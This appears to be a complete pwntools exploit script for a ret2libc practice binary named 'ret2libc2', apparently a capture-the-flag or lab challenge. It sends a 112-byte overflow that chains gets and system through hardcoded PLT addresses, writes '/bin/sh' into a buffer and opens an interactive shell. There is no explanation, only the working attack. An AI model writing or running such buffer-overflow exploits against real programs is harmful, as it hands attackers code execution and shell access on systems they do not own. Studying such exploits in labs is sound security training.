from pwn import*
sh = process('./ret2libc2')
system_plt = 0x08048490
gets_plt = 0x08048460
buf2 = 0x0804A080
payload = 112 * b'A' + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
